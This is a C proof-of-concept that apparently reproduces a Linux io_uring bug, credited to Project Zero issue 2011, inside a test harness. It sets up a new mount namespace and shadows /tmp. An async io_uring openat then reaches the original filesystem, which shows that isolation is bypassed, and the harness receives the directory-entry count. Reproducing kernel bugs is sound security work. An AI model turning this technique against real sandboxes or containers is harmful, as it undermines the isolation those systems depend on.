#define _GNU_SOURCE
#include <sched.h>
#include <sys/ioctl.h>
#include <sys/wait.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <fcntl.h>
#include <stdbool.h>
#include <stdarg.h>
#include <sys/resource.h>
#include <linux/io_uring.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <dirent.h>
#include <err.h>

#include "comm.h"

// Thanks for the poc provided in https://bugs.chromium.org/p/project-zero/issues/detail?id=2011.

#ifndef SYS_io_uring_enter
#define SYS_io_uring_enter 426
#endif
#ifndef SYS_io_uring_setup
#define SYS_io_uring_setup 425
#endif

#define SYSCHK(x) ({          \
  typeof(x) __res = (x);      \
  if (__res == (typeof(x))-1) \
    err(1, "SYSCHK(" #x ")"); \
  __res;                      \
})


#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
                            } while (0)


int main() {
        if(init_exec_sync()) {
                errExit("exec sync");
        }
        // Setup stage, similar to Syzkaller executor's 
        // do_sandbox_namespace().
        if (unshare(CLONE_NEWNS)) {
                errExit("unshare");
        }
        system("mount -t tmpfs none /tmp");
        // Handshake
        if (exec_wait_nosig(10000)) {
                errExit("exec wait");
        }
        if (exec_notify()) {
                errExit("exec notify");
        }
        // Wait
        if (exec_wait_nosig(10000)) {
                errExit("exec wait");
        }
        // initialize uring
        struct io_uring_params params = { };
        int uring_fd = SYSCHK(syscall(SYS_io_uring_setup, /*entries=*/10, &params));
        unsigned char *sq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQ_RING));
        unsigned char *cq_ring = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_CQ_RING));
        struct io_uring_sqe *sqes = SYSCHK(mmap(NULL, 0x1000, PROT_READ|PROT_WRITE, MAP_SHARED, uring_fd, IORING_OFF_SQES));

        // execute openat via uring
        sqes[0] = (struct io_uring_sqe) {
                .opcode = IORING_OP_OPENAT,
                .flags = IOSQE_ASYNC,
                .fd = open("/", O_RDONLY),
                .addr = (unsigned long)"/",
                .open_flags = O_PATH | O_DIRECTORY
        };
        ((int*)(sq_ring + params.sq_off.array))[0] = 0;
        (*(int*)(sq_ring + params.sq_off.tail))++;
        int submitted = SYSCHK(syscall(SYS_io_uring_enter, uring_fd, /*to_submit=*/1, /*min_complete=*/1, /*flags=*/IORING_ENTER_GETEVENTS, /*sig=*/NULL, /*sigsz=*/0));
        int cq_tail = *(int*)(cq_ring + params.cq_off.tail);
        if (cq_tail != 1) errx(1, "expected cq_tail==1");
        struct io_uring_cqe *cqe = (void*)(cq_ring + params.cq_off.cqes);
        if (cqe->res < 0) {
                fprintf(stderr, "cannot open, ret=%d, (%s)\n", cqe->res, strerror(-cqe->res));
                exit(1);
        }
        char dentbuf[4096];
        int tmpfd = openat(cqe->res, "tmp", O_RDONLY);
        int dentsize = syscall(SYS_getdents64, tmpfd, dentbuf, sizeof(dentbuf));
        char buf[4096] = {0};
        buf[0] = '0';
        snprintf(buf, sizeof(buf), "%d", dentsize);
        if (exec_notify()) {
                errExit("exec notify");
        }
        if (write(kReplyFd, buf, strlen(buf)) == -1) {
                errExit("write");
        }
        while(1) {
                sleep(100000);
        }
        return 0;

}